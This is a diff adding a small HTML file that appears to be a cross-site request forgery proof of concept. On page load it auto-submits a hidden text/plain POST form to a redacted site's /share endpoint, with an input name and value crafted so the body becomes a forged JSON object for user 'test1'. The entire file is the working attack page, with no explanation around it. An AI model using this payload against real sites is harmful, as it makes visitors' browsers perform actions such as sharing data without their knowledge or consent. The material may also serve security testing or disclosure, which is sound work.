@@ -1,0 +1,7 @@
+<html>
+	<body onload="document.getElementById('csrf').submit()">
+		<form id=csrf action=http://[URL]/share method=POST enctype="text/plain">
+			<input name='{"user":"test1","id":0,"fake":"' value='"}'>
+		</form>
+	</body>
+</html>
